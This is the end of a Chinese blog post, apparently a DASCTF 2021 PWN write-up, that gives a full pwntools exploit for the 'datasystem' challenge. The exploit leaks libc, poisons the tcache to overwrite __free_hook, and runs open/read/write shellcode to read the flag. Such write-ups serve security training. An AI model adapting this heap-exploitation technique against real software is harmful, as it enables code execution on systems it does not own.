+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./datasystem&quot;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./datasystem&#x27;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27961</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Size: \n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	p.recvuntil(<span class="hljs-string">&quot;what&#x27;s your Content: \n&quot;</span>)<br>	p.send(content)<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; :\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>p.recvuntil(<span class="hljs-string">&quot;please input username: &quot;</span>)<br>p.send(<span class="hljs-string">&quot;admin&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;please input password: &quot;</span>)<br>p.send(<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x410</span>, <span class="hljs-string">&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;c&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec090</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + p64(<span class="hljs-number">0x71</span>) + p64(<span class="hljs-number">0x23330000</span>)<br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">	mov rdi, 0x23330000</span><br><span class="hljs-string">	xor rsi, rsi</span><br><span class="hljs-string">	mov rax, 2</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string">	</span><br><span class="hljs-string">	mov rdi, rax</span><br><span class="hljs-string">	mov rsi, rsp</span><br><span class="hljs-string">	mov rdx, 0x50</span><br><span class="hljs-string">	xor rax, rax</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, 1</span><br><span class="hljs-string">	mov rax, 1</span><br><span class="hljs-string">	syscall	</span><br><span class="hljs-string">	&#x27;&#x27;&#x27;</span><br>)<br>add(<span class="hljs-number">0x60</span>, payload)<br>add(<span class="hljs-number">0x60</span>,<span class="hljs-string">&#x27;b&#x27;</span>)<br>add(<span class="hljs-number">0x60</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span> + shellcode)<br><br>add(<span class="hljs-number">0x8</span>,<span class="hljs-string">&#x27;c&#x27;</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x21</span>) + p64(free_hook))<br>add(<span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>add(<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x23330000</span> + <span class="hljs-number">0x8</span>))<br>free(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+      </section>
+      <section class="extra">
+        
+          <ul class="copyright">
+  
+    <li><strong>本文作者：</strong>ShouCheng</li>
+    <li><strong>本文链接：</strong><a href="http://example.com/2021/09/28/2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF/index.html" title="http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;28&#x2F;2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF&#x2F;index.html">http:&#x2F;&#x2F;example.com&#x2F;2021&#x2F;09&#x2F;28&#x2F;2021-09-28-2021%E4%B9%9D%E6%9C%88DASCTF&#x2F;index.html</a></li>
+    <li><strong>版权声明：</strong>本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" title="BY-NC-SA" target="_blank" rel="noopener">BY-NC-SA</a> 许可协议，转载请注明出处！</li>
+  
+</ul>
+        
+        
+        
+  <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PWN/" rel="tag">PWN</a></li></ul> 
+
+        
+  <nav class="nav">
+    <a href="/2021/10/01/2021-10-01-2021%E7%BB%BF%E5%9F%8E%E6%9D%AFPWN/"><i class="iconfont iconleft"></i>2021绿城杯</a>
+    <a href="/2021/09/26/2021-09-26-2021%E5%A4%A9%E7%BF%BC%E6%9D%AFPWN/">2021天翼杯PWN<i class="iconfont iconright"></i></a>
+  </nav>
+
+      </section>
+      
+        <section class="comments">
+  
+    <div class="btn" id="comments-btn">查看评论</div>
+  
+  
+</section>
+      
+    </section>
+  </div>
+</article></div>
+      <div class="col-xl-3">
+        
+          
+  <aside class="toc-wrap">
+    <h3 class="toc-title">文章目录：</h3>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hehepwn"><span class="toc-text">hehepwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hahapwn"><span class="toc-text">hahapwn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#datasystem"><span class="toc-text">datasystem</span></a></li></ol>
+  </aside>
+
+        
+      </div>
+    </div>
+  </div>
+</main>
+  
+
+<footer class="footer">
+  <div class="footer-social"><a 
+        href="tencent://message/?Menu=yes&uin=1145020611 "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#12B7F5'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconQQ "></i>
+      </a><a 
+        href="javascript:; "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#09BB07'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconwechat-fill "></i>
+      </a><a 
+        href="https://www.instagram.com/izhaoo/ "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#DA2E76'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconinstagram "></i>
+      </a><a 
+        href="https://shoucheng3.github.io "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color= '#9f7be1'" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  icongithub-fill "></i>
+      </a><a 
+        href="mailto:1145020611@qq.com "
+        target="_blank"
+        class="footer-social-item"
+        onMouseOver="this.style.color=#FF3B00" 
+        onMouseOut="this.style.color='#33333D'">
+          <i class="iconfont  iconmail"></i>
+      </a></div>
+  
+    <div class="footer-copyright"><p>Powered by <a target="_blank" href="https://hexo.io">Hexo</a>  |  Theme - <a target="_blank" href="https://github.com/izhaoo/hexo-theme-zhaoo">zhaoo</a></p></div>
+  
+</footer>
+  
+      <div class="fab fab-plus">
+    <i class="iconfont iconplus"></i>
+  </div>
+  
+    <div class="fab fab-daovoice">
+      <i class="iconfont iconcomment"></i>
+    </div>
+  
+  
+    <a href="https://support.qq.com/product/325288# app_id" target="_blank">
+      <div class="fab fab-tencent-chao">
+        <i class="iconfont iconcomment"></i>
+      </div>
+    </a>
+  
+  <div class="fab fab-up">
+    <i class="iconfont iconcaret-up"></i>
+  </div>
+  
+  
+  
+    
+<script src="/js/color-mode.js"></script>
+
+  
+  
+    <div class="search">
+  <div class="search-container">
+    <div class="search-close">
+      <i class="iconfont iconbaseline-close-px"></i>
+    </div>
+    <div class="search-input-wrapper">
+      <i class="search-input-icon iconfont iconsearch"></i>
+      <input class="search-input" type="search" id="search-input" placeholder="Search..." autofocus autocomplete="off"
+        autocorrect="off" autocapitalize="off">
+    </div>
+    <div class="search-output" id="search-output"></div>
+  </div>
+</div>
+  
+</body>
+
+<script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.lazyload/1.9.1/jquery.lazyload.min.js"></script>
+
+
+
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+  
+<script src="https://cdn.bootcdn.net/ajax/libs/jquery.qrcode/1.0/jquery.qrcode.min.js"></script>
+
+
+
+
+<script src="/js/utils.js"></script>
+<script src="/js/script.js"></script>
+
+
+
+
+
+  
+
+<script>
+  (function (i, s, o, g, r, a, m) {
+    i["DaoVoiceObject"] = r;
+    i[r] = i[r] || function () {
+      (i[r].q = i[r].q || []).push(arguments)
+    }, i[r].l = 1 * new Date();
+    a = s.createElement(o), m = s.getElementsByTagName(o)[0];
+    a.async = 1;
+    a.src = g;
+    a.charset = "utf-8";
+    m.parentNode.insertBefore(a, m)
+  })(window, document, "script", "https://widget.daovoice.io/widget/0f81ff2f.js", "daovoice")
+  daovoice('init', {
+    app_id: "3abd194f# app_id"
+  }, {
+    launcher: {
+      disableLauncherIcon: true,
+    },
+  });
+  daovoice('update');
+</script>
+
+
+
+  <script>
+    (function () {
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      } else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</html>
